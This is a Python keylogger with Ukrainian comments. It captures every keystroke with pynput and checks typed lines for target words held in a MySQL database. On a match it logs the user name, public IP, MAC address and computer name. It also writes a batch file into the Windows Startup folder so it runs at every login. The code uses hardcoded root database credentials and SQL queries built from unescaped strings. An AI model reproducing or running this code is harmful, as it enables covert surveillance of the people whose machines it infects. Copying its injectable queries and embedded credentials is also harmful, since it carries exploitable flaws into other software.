from pynput import keyboard
import requests
import getpass
from datetime import datetime
import uuid
import mysql.connector
from mysql.connector import Error
import os
USER_NAME = getpass.getuser()
##Налаштування бази данних
#створюєм конект з базою данних
def create_connection(host_name, user_name, user_password, db_name):
    connection = None
    try:

        connection=mysql.connector.connect(
            host='localhost',
            user='root',
            password='rootroot',
            database='info',
            auth_plugin='mysql_native_password'

        )
        print("Connection to MySQL DB successful")
    except Error as e:
        print(f"The error '{e}' occurred")

    return connection

connection = create_connection("localhost", "root", "", 'db_name')

def execute_query(connection, query):
  cursor = connection.cursor()
  try:
    cursor.execute(query)
    connection.commit()
    print("Query executed successfully")
  except Error as e:
    print(f"The error '{e}' occurred")


def execute_read_query(connection, query):
    cursor = connection.cursor()
    result = None
    try:
        cursor.execute(query)
        result = cursor.fetchall()
        return result
    except Error as e:
        print(f"The error '{e}' occurred")


#оголошуєм змінні
list = []
string = ''
target = []
#витягуєм слова на які реагує програма
select_products = "SELECT word from info.target_words "
get_target = execute_read_query(connection, select_products)
print(get_target)
#дізнаємось айпі адрес
r = requests.get('https://ramziv.com/ip').text
#дізнаємось назву комп'ютера
user = getpass.getuser()
select_users = "SELECT name,ip from info.info_users "
get_users = execute_read_query(connection, select_users)
#створюєм список з данними користувача
people = []
people.append(user)
people.append(r)

#перевірка чи користувач є в базі данних якщо ні то створюєм
if tuple(people) in get_users:
    pass
else:
    create_user = f'''
                        INSERT INTO `info`.`info_users` 
                        (`name`,`ip`) 
                        VALUES ('{user}','{r}');
                    '''
    execute_query(connection, create_user)

for words in get_target:
    target.append(words[0])
#функція яка отримує кожне натискання клавіші
def on_release(key):
    if key != keyboard.Key.enter:
        print(key)
        list.append((str(key))[1])

    if key == keyboard.Key.enter:
        for i in list:
            global string
            string += str(i)

        print(string)
        for i in target:
            # перевірка чи є в тому що ввів користувач необхідне слово
            print(target)
            print(i)
            if str(i) in str(string):
                # витягуєм данні які потрібно внести в базу данних
                r = requests.get('https://ramziv.com/ip').text
                user = getpass.getuser()
                date = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                #мак адрес
                def get_mac():
                    mac_num = hex(uuid.getnode()).replace('0x', '').upper()
                    mac = '-'.join(mac_num[i: i + 2] for i in range(0, 11, 2))
                    return mac
                select_count = f"SELECT count from info.info WHERE ip = '{r}' AND name = '{user}' AND word = '{i}' AND mac = '{get_mac()}'"
                get_count = execute_read_query(connection, select_count)
                #ім'я комп'ютера
                import socket
                computer_name  = (socket.gethostname())
                # створюєм користувача
                if len(get_count) <= 0 :
                    create_user = f'''
                                            INSERT INTO `info`.`info` 
                                            (`name`,`ip`, `date`, `word`,`count`,`mac`,`computer_name`) 
                                            VALUES ('{user}','{r}', '{date}', '{i}','1','{get_mac()}','{computer_name}');
                                            '''
                    execute_query(connection, create_user)
                else:
                    # якщо користувач повторив слово то добавляєм +1 до кількості
                    select_count = f"SELECT count,word from info.info WHERE ip = '{r}' AND name = '{user}' AND word = '{i}';"
                    get_count = execute_read_query(connection, select_count)
                    update_user = f'''
                                    UPDATE `info`.`info` SET `count` = '{int(get_count[0][0])+1}'
                                    WHERE ip = '{r}' AND name = '{user}' AND word = '{i}';
                                   '''
                    execute_query(connection, update_user)
            else:
                pass
        string = ''
        list.clear()
        return on_release
# створюєм батник який буде запускати дану програму і добавляєм його в автозагрузку
file_path = ""
if file_path == "":
    file_path = os.path.abspath(os.curdir)
print(file_path)
bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
with open(bat_path + '\\' + "open.bat", "w+") as bat_file:
    bat_file.write(r'start "" %s' % file_path)


with keyboard.Listener(on_release=on_release) as listener:
    listener.join()